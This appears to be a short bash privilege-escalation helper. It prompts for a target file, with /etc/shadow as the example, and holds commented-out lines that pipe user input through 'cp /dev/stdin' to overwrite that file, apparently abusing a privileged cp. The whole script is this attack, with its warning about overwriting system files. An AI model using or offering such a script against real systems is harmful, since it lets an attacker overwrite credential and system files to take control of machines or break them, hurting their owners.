#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
echo "This file can overwrite the system files use at your own risk. If you are sure to use this binary then uncomment the following lines and run at your own risk."
#echo -n "[i] Provide input to overrite in $filepath: "
#read input
#echo $input | cp /dev/stdin "$filepath"
